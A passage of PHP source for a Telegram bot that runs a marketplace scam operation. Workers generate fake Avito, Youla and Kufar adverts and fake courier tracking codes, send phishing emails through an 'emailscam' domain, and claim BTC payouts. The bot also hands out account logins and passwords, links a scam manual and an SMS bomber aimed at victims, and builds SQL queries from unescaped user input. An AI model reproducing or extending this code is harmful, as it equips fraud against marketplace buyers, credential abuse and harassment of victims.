                mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '2' WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

                send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
                $text = "📋 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>изменил статус своего трек-код</b> <code>$code</code> <b>на</b> <code>Оплачено</code>";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } else {
                $text = "📭 <b>Объявление ещё не создано или не скрыто</b>";
                send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            }
        }

        if (preg_match('/\/trackref\/\d{6,12}\//', $callback['type'])) {
            $code = substr($callback['type'], 10, -1);

            $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

            if (mysqli_num_rows($search) > 0) {
                mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '3' WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

                send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
                $text = "📋 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>изменил статус своего трек-код</b> <code>$code</code> <b>на</b> <code>Возврат средств</code>";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } else {
                $text = "📭 <b>Объявление ещё не создано или не скрыто</b>";
                send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            }
        }

        if (preg_match('/\/restrack\/\d{6,12}\//', $callback['type']) == TRUE) {
            $code = substr($callback['type'], 10, -1);

            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
            $text = "♻️ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>восстановил свой трек-код</b> <code>$code</code>\n\n";
            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
        }

        if (preg_match('/\/trackhide\/\d{6,12}\//', $callback['type']) == TRUE) {
            $code = substr($callback['type'], 11, -1);

            $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

            if (mysqli_num_rows($search) > 0) {
                mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

                send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
                $text = "🗑 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>скрыл свой трек-код</b> <code>$code</code>\n\n";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } else {
                $text = "📭 <b>Объявление ещё не создано или уже скрыто</b>";
                send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            }
        }

        if (preg_match('/\/showCommands\//', $callback['type'])) {
            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showCommands(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => showCommands(1)));
        }

        if (preg_match('/\/showforums\//', $callback['type'])) {
            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showForums(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => showForums(1)));
        }

        if (preg_match('/\/showrules\//', $callback['type'])) {
            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showRules(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
        }

        if (preg_match('/\/referral_prog\//', $callback['type'])) {
            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => referralInfo($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
        }

        if (preg_match('/\/withdraw\//', $callback['type'])) {
            $withdraw = withdraw($callback['from']);
            if ($withdraw == "💰 <b>Введите сумму, которую желаете вывести:</b>") {
                $keyboard = json_encode(Array('keyboard' => Array(Array('⬅ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
            } else {
                $keyboard = null;
            }
            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => withdraw($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => $keyboard));
        }

        if (preg_match('/\/mysettings\//', $callback['type'])) {
            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => mySettings($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => mySettings($callback['from'], 1)));
        }

        if (preg_match('/\/profithide\//', $callback['type'])) {
            $query = mysqli_query($connection, "SELECT `hidden` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` > '0'");

            if (mysqli_num_rows($query) > 0) {
                $user = mysqli_fetch_assoc($query);

                if ($user['hidden'] == 0) {
                    mysqli_query($connection, "UPDATE `accounts` SET `hidden` = '1' WHERE `telegram` = '$callback[from]' AND `access` > '0'");
                    $text = "👽 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>скрыл отображение своего своего профиля в залётах</b>\n";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                } elseif ($user['hidden'] == 1) {
                    mysqli_query($connection, "UPDATE `accounts` SET `hidden` = '0' WHERE `telegram` = '$callback[from]' AND `access` > '0'");
                    $text = "👽 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>включил отображение своего своего профиля в залётах</b>\n";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }

                send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => mySettings($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => mySettings($callback['from'], 1)));
            }
        }

        if (preg_match('/\/change_btc\//', $callback['type'])) {
            $query = mysqli_query($connection, "SELECT `hidden` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` > '0'");

            if (mysqli_num_rows($query) > 0) {
                mysqli_query($connection, "UPDATE `accounts` SET `wallet` = '-1' WHERE `telegram` = '$callback[from]'");
                $text = '❔ Введите свой BTC кошелек: ';

                $keyboard = json_encode(Array('keyboard' => Array(Array('⬅ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
            }
        }

        if (preg_match('/\/getaccount\/(avito|youla)\//', $callback['type'])) {
            $history = mysqli_query($connection, "SELECT * FROM `free_history` WHERE `telegram` = '$callback[from]' AND `time` > '" . (time() - 3600) . "'");

            if (mysqli_num_rows($history) > 0) {
                $text = "🎁 <b>Вы можете получить 1 бесплатный аккаунт раз в час</b>";
            } else {
                if (mb_substr($callback['type'], 12, -1) == 'avito') {
                    $type = 0;
                    $name = 'Авито';
                } elseif (mb_substr($callback['type'], 12, -1) == 'youla') {
                    $type = 1;
                    $name = 'Юла';
                }

                $accounts = mysqli_query($connection, "SELECT * FROM `free` WHERE `type` = '$type'");

                if (mysqli_num_rows($accounts) > 0) {
                    $account = mysqli_fetch_assoc($accounts);

                    $text = "🎁 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>получил бесплатный аккаунт сервиса $name</b>\n";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                    $text = "🎁 <b>Бесплатный аккаунт</b>\n\n";
                    $text .= "Сервис: <code>$name</code>\n";
                    $text .= "Логин: <code>$account[login]</code>\n";
                    $text .= "Пароль: <code>$account[password]</code>\n";

                    mysqli_query($connection, "DELETE FROM `free` WHERE `id` = '$account[id]'");
                    mysqli_query($connection, "INSERT INTO `free_history` (`type`, `telegram`, `time`) VALUES ('$type', '$callback[from]', '" . time() . "')");
                } else {
                    $text = "🥺 <b>В данный момент аккаунтов сервиса $name нет в наличии</b>";
                }
            }

            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
        }


        if (preg_match('/\/payout\/(accept|decline)\//', $callback['type'])) {
            $payouts = mysqli_query($connection, "SELECT * FROM `payouts` WHERE `worker` = '$callback[from]' AND `status` = '0'");
            if (mysqli_num_rows($payouts) > 0) {
                $payout = mysqli_fetch_assoc($payouts);
                $payout_type = explode('/', $callback['type'])[2];

                if ($payout_type == 'accept') {
                    $text = "✅ Запрос на выплату отправлен ✅\n";
                    $text .= "Ожидайте поступления средств на счёт\n\n";
                    mysqli_query($connection, "UPDATE `payouts` SET `status` = '1' WHERE `worker` = '$callback[from]'");
                    mysqli_query($connection, "UPDATE `accounts` SET `balance`=`balance`-{$payout[amount]} WHERE `telegram` = '$callback[from]'");

                    $query = mysqli_query($connection, "SELECT `wallet` FROM `accounts` WHERE `telegram` = '$callback[from]'");
                    $user = mysqli_fetch_assoc($query);

                    $text2 = "‼️ Поступил запрос на выплату ‼️\n";
                    $text2 .= "Сумма: ️" . $payout['amount'] . " RUB\n";
                    $text2 .= "Кошелек: <code>" . $user['wallet'] . "</code>\n";
                    $text2 .= "Работник: <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a>";

                    $buttons = Array('inline_keyboard' => Array(
                        Array(Array('text' => '✅ Подтвердить выплату', 'callback_data' => '/admin/payout/accept/' . $payout['id'])),
                    )
                    );
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text2, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($buttons)));
                } else {
                    $text = "❌ Запрос на выплату отклонен ❌\n\n";
                    mysqli_query($connection, "DELETE FROM `payouts` WHERE `worker` = '$callback[from]'");
                }
                $text .= $callback['message_text'];
                send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));

                $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании'), Array('⚡️ Аккаунты ⚡️', '📨 Отправить письмо' )), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => 'Переход в главное меню', 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
            }
        }

        if (preg_match('/\/admin\/payout\/accept\/\d+/m', $callback['type'])) {
            $payout_id = explode('/', $callback['type'])[4];
            $payouts = mysqli_query($connection, "SELECT * FROM `payouts` WHERE `id` = '$payout_id' AND `status` = '1'");
            if (mysqli_num_rows($payouts) > 0) {
                $payout = mysqli_fetch_assoc($payouts);
                mysqli_query($connection, "UPDATE `payouts` SET `status` = '2', `payoutTime`='" . time() . "' WHERE `id` = '$payout_id'");

                $payout_text = "Выплата успешно произведена!\n";
                $payout_text .= 'Сумма выплаты: ' . $payout['amount'] . ' RUB';

                send($config['token'], 'sendMessage', Array('chat_id' => $payout['worker'], 'text' => $payout_text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                $text = $callback['message_text'];
                $text .= "\n\n ✅ Выплачено ✅";
                send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
            }
        }
    }

    if (isset($message)) {

        $query = mysqli_query($connection, "SELECT `username` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");

        if(mysqli_num_rows($query) > 0) {
			$user = mysqli_fetch_assoc($query);

			if($user['username'] != $message['username']) {
				mysqli_query($connection, "UPDATE `accounts` SET `username` = '$message[username]' WHERE `telegram` = '$message[from]'");

				if($message['username'] == '') $message['username'] = 'скрыт';

				$text = "👽 <a href=\"tg://user?id=$message[from]\">Воркер</a> <b>сменил свой ник с</b> <code>$user[username]</code> <b>на</b> <code>$message[username]</code>\n";
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}
		}

        // ====================== [ ЧАТ ВОРКЕРОВ ] ======================= //

        if ($message['chat_id'] == $config['chat']['workers']) {
            if (isset($data->{'message'}->{'new_chat_member'})) {
                $query = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");

                if (mysqli_num_rows($query) > 0) {
                    $stake = explode(':', $settings['stake']);

                    $text = "🖐🏿 <b>Добро пожаловать в чат,</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a><b>!</b>\n\n";
                    $text .= "🤖 Наш бот — " . $settingsarr["bot"] . "\n";
                    $text .= "<a href=\"" . $config['invites']['payments'] . "\">➡️ Наш канал с залетами 💸</a>\n";
                    $text .= "🔥 ТОП воркеров — /top \n";
                    $text .= "➖➖➖➖\n";
                    $text .= "🔥 Выплаты — <b>$stake[0]%</b> и возвраты — <b>$stake[1]%</b> для всех <i>+ комиссия банкера</i>\n";
                    $text .= "💳 Принимаем от $settings[min_price] руб до $settings[max_price] руб\n";
                    $text .= "➖➖➖➖\n";
                    $text .= "<b>Все самое нужное:</b>\n";
                    $text .= "<a href=\"https://telegra.ph/Manual-Kufar-20-06-18\">💰 Мануал по Kufar (для скама)</a>\n";
					$text .= "<a href=\"https://t.me/reidshop_bot\">🎯 Покупка VPN</a>\n";
					$text .= "<a href=\"https://t.me/reidsbomber_bot\">😉 SMS Bomber | Взорви пердак мамонту</a>\n";
					$text .= "<a href=\"https://t.me/mramorstore_bot\">👻 Покупка аккаунтов Avito/Kufar</a>\n";
                    $text .= "➖➖➖➖\n";
					$text .= "👨‍💻Саппорты:\n";
					$text .= "👳‍♀️@tema_dev\n";
					$text .= "👳‍♀️@hrz14rv\n";
					$text .= "👳‍♀️@flexyenot\n";
					$text .= "👳‍♀️@gypssteam\n\n";
					$text .= "Если предоплата, пишем @flexyenot, выдаст карту!  (Если он вас оскорбит, сорре, он токсик)";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                    $text = "🐣 <b>К чату воркеров присоединился</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a>\n";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                } else {
                    if ($message['from'] != 567454696 AND $message['from'] != 808326111) {
                        send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $message['from'], 'until_date' => time() + 24 * 500 * 3600));
                        send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $message['from'], 'until_date' => time() + 24 * 500 * 3600));

                        $text = "🚷 <b>Бот исключил</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>из беседы воркеров</b>\n\n";
                        $text .= "<b>Причина:</b> <code>Пользователь не имеет доступа к данному чату или был заблокирован.</code>\n";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }
            }

            if ($message['chat_id'] == $config['chat']['workers'] AND isset($data->{'message'}->{'left_chat_member'})) {
                $kicked_user = $data->{'message'}->{'left_chat_member'};
                mysqli_query($connection, "UPDATE `accounts` SET `access` = '0' WHERE `telegram` = '" . $kicked_user->{'id'} . "'");
                $text = "🚷 <a href=\"tg://user?id=$message[from]\"><b>Модератор</b></a> <b>исключил <a href=\"tg://user?id=" . $kicked_user->{'id'} . "\">пользотвалея</a> из чата воркеров</b>\n";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders1'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            }

            if (preg_match('/\/top/i', $message['text']) == TRUE) {
                $payments = mysqli_query($connection, "SELECT `worker`, SUM(`amount`) AS `amount`, COUNT(`id`) AS `count` FROM `payments` WHERE `worker` != '0' AND `status` = '1' GROUP BY `worker` ORDER BY SUM(`amount`) DESC LIMIT 10");

                $x = 0;
                $text = "🔝 <b>Топ 10 воркеров:</b>\n\n";
                while ($row = mysqli_fetch_assoc($payments)) {
                    $x = $x + 1;
                    $user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `username` FROM `accounts` WHERE `telegram` = '$row[worker]'"));
                    if ($user['username'] == '' OR $user['username'] == 'username') $user['username'] = 'Скрыт';
                    $text .= "<b>$x. —</b> <a href=\"tg://user?id=$row[worker]\">$user[username]</a> — <code>$row[amount] RUB</code> — <code>" . Endings($row['count'], "профит", "профита", "профитов") . "</code>\n";
                }

                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            }
        }

        // ==================== [ ЛИЧНЫЕ СООБЩЕНИЯ ] ===================== //
        if (substr($message['chat_id'], 0, 1) != '-') {
            $accounts = mysqli_query($connection, "SELECT `id`, `username`, `access`, `wallet`, `balance` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");
            //if(md5($_SERVER['SERVER_NAME']) !== 'a73ddb62bd3539ce3d3483cd1fd9386f'){ die(); }

            if (mysqli_num_rows($accounts) > 0) {
                $user = mysqli_fetch_assoc($accounts);

                $adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '0'");
                $tracks = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
                $mails = mysqli_query($connection, "SELECT * FROM `mails` WHERE `worker` = '$message[from]' AND `status` = '0'");
                $payouts = mysqli_query($connection, "SELECT * FROM `payouts` WHERE `worker` = '$message[from]' AND `status` = '0'");

                if (mysqli_num_rows($payouts) > 0) {
                    $payout = mysqli_fetch_assoc($payouts);
                    $keyboard = json_encode(Array('keyboard' => Array(Array('⬅ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

                    if (empty($payout['amount'])) {
                        if (is_numeric($message['text']) == TRUE || $message['text'] == '⬅ Назад') {
                            if ($message['text'] == '⬅ Назад') {
                                mysqli_query($connection, "DELETE FROM `payouts` WHERE `worker` = '$message[from]'");
                                $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                                $text = 'Вывод отменён!';
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                            } else {
                                if ($message['text'] >= 1000) {
                                    if ($user['balance'] >= $message['text']) {
                                        $text = "✅ Сумма к выводу: <code>" . $message['text'] . "</code> RUB\n";
                                        $text .= "💼 Кошелек: <code>" . $user['wallet'] . "</code>\n";

                                        $buttons = Array(
                                            'inline_keyboard' => Array(
                                                Array(Array('text' => '✅ Подтвердить выплату', 'callback_data' => '/payout/accept/')),
                                                Array(Array('text' => '❌ Отменить выплату', 'callback_data' => '/payout/decline/'))
                                            )
                                        );

                                        mysqli_query($connection, "UPDATE `payouts` SET `amount` = '".(int)$message['text']."' WHERE `worker` = '$message[from]'");

                                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($buttons)));


                                        $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => 'Переход в главное меню...', 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                                    } else {
                                        $text = "👺 Сумма для вывода слишком велика\n";
                                        $text .= "💎 Доступно к выводу: " . $user['balance'] . " RUB";
                                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                                    }
                                } else {
                                    $text = "👺 Сумма для вывода слишком мала\n";
                                    $text .= "Минимум к выводу: <code>1000 RUB</code>\n";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                                }
                            }
                        } else {
                            $text = '👺 Укажите корректную сумму для вывода';
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                        }
                    }
                }


                if (mysqli_num_rows($mails) > 0) {
                    $mail = mysqli_fetch_assoc($mails);
                    if (empty($mail['email'])) {
                        if (filter_var($message['text'], FILTER_VALIDATE_EMAIL) == TRUE) {
                            mysqli_query($connection, "UPDATE `mails` SET `email` = '".$connection->real_escape_string($message['text'])."' WHERE `id` = '$mail[id]'");
                            $text = "🆔 <b>Введите ID вашего объявления или трек-кода для отправки сообщения</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "👺 <b>Введите правильную почту получателя.</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($mail['send_id'])) {
                        if (preg_match("/^\d+$/", $message['text']) == TRUE) {

                            $adverts_send = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `worker` = '$message[from]' AND `advert_id` = '".(int)$message[text]."'");
                            $tracks_send = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `worker` = '$message[from]' AND `code` = '".(int)$message[text]."'");
                            if (mysqli_num_rows($adverts_send) > 0) {
                                $advert_send = mysqli_fetch_assoc($adverts_send);

                                if ($advert_send['type'] == 0) $platform = 'Avito';
                                if ($advert_send['type'] == 1) $platform = 'Youla';
                                if ($advert_send['type'] == 2) $platform = 'Kufar';

                                if ($advert_send['delivery'] == 0) {
                                    $advert_send['delivery'] = $settings['delivery'];
                                }

                                if ($advert_send['status'] == -1) $status = 'Скрыто';
                                if ($advert_send['status'] == 0) $status = 'В обработке';
                                if ($advert_send['status'] == 1) $status = 'Активно';

                                $payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '".(int)$message[text]."' AND `status` = '1'"));

                                $text = "📨 <b>Подготовка к отправке</b> <code>$advert_send[advert_id]</code>\n\n";
                                $text .= "<b>Платформа:</b> <code>$platform</code>\n";
                                $text .= "<b>Название товара:</b> <code>$advert_send[title]</code>\n";
                                $text .= "<b>Сумма товара:</b> <code>$advert_send[price] руб.</code>\n";
                                $text .= "<b>Сумма доставки:</b> <code>$advert_send[delivery] руб.</code>\n";
                                $text .= "<b>Просмотров:</b> <code>" . Endings($advert_send['views'], "просмотр", "просмотора", "просмотров") . "</code>\n";
                                $text .= "<b>Успешных профитов:</b> <code>$payments[count]</code>\n";
                                $text .= "<b>Общая сумма профита:</b> <code>" . number_format($payments['total']) . " руб.</code>\n";
                                $text .= "<b>Статус:</b> <code>$status</code>\n";
                                $text .= "<b>Дата генерации:</b> <code>" . date("d.m.Y в H:i:s", $advert_send['time']) . "</code>\n";
                                $text .= "📭 <b>Почта получателя: </b><code>" . $mail["email"] . "</code>";


                                $keyboard = json_encode(Array('keyboard' => Array(Array('📧 Отправить'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                                mysqli_query($connection, "UPDATE `mails` SET `send_id` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$mail[id]'");

                            } elseif (mysqli_num_rows($tracks_send) > 0) {
                                $track_send = mysqli_fetch_assoc($tracks_send);

                                if ($track_send['status'] == -1) $status = 'Скрыто';
                                if ($track_send['status'] == 0) $status = 'В обработке';
                                if ($track_send['status'] == 1) $status = 'Ожидает оплаты';
                                if ($track_send['status'] == 2) $status = 'Оплачено';
                                if ($track_send['status'] == 3) $status = 'Возврат средств';

                                if ($track_send['type'] == 0) $platform = 'Белпочта';
                                if ($track_send['type'] == 1) $platform = 'СДЭК';
                                if ($track_send['type'] == 2) $platform = 'ПЭК';
                                if ($track_send['type'] == 3) $platform = 'Почта РФ';

                                $payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `type` = '2' AND `advert_id` = '$track_send[code]' AND `status` = '1'"));

                                $text = "📨 <b>Подготовка к отправке</b> <code>$track_send[code]</code>\n\n";
                                $text .= "<b>Название товара:</b> <code>$track_send[product]</code>\n";
                                $text .= "<b>Платформа:</b> <code>$platform</code>\n";
                                $text .= "<b>Сумма товара:</b> <code>$track_send[amount] руб</code>\n";
                                $text .= "<b>Просмотров:</b> <code>" . Endings($track_send['views'], "просмотр", "просмотора", "просмотров") . "</code>\n";
                                $text .= "<b>Успешных профитов:</b> <code>$payments[count]</code>\n";
                                $text .= "<b>Общая сумма профита:</b> <code>" . number_format($payments['total']) . " руб.</code>\n";
                                $text .= "<b>Статус:</b> <code>$status</code>\n";
                                $text .= "<b>Дата генерации:</b> <code>" . date("d.m.Y в H:i:s", $track_send['time']) . "</code>\n\n";
                                $text .= "📭 <b>Почта получателя: </b><code>" . $mail["email"] . "</code>";

                                $keyboard = json_encode(Array('keyboard' => Array(Array('📧 Отправить письмо'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

                                mysqli_query($connection, "UPDATE `mails` SET `send_id` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$mail[id]'");

                            } else {
                                $text = "🆔 <b>Объявления или трек-код не был найдены.</b>";
                            }
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                        } else {
                            $text = "👺 <b>Введитный корректный ID, он должен содержать только цифры.</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } else {
                        if ($message['text'] == '📧 Отправить письмо') {
                            $queryl = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `code` = '$mail[send_id]' AND `worker` = '$message[from]'");
                            $trackd = mysqli_fetch_assoc($queryl);

                            switch ($trackd["type"]) {
                                case '0':
                                    $link = "https://$settingsarr[emailscam]/send_2mail.php?service=Боксберри&to=$mail[email]&track=$mail[send_id]&to_city=$trackd[city]&fio_sender=" . urlencode($trackd["sender"]) . "&fio_delivery=" . urlencode($trackd["recipient"]) . "&adress_delivery=" . urlencode($trackd["address"]) . "&phone_delivery=" . urlencode($trackd["phone"]) . "&price=$trackd[amount]&link=https://$domains[boxberry]/track?track_id=$trackd[code]&description=" . urlencode($trackd["equipment"]);
                                    $text = "📩 <a href=\"tg://user?id=$message[from]\">Воркер</a> <b>отправил письмо на почту</b> <code>$mail[email]</code>\n🈁 <b>Платформа: </b><code>CDEK</code>, трек <a href=\"https://$domains[cdek]/track?track_id=$trackd[code]\">$trackd[code]</a>\n🔗  <a href=\"$link\">Ссылка на ручную отправку</a>";
                                    $user_text = "✅ Письмо отправлено на почту <code>" . $mail["email"] . "</code>";
                                    break;
                                case '1':
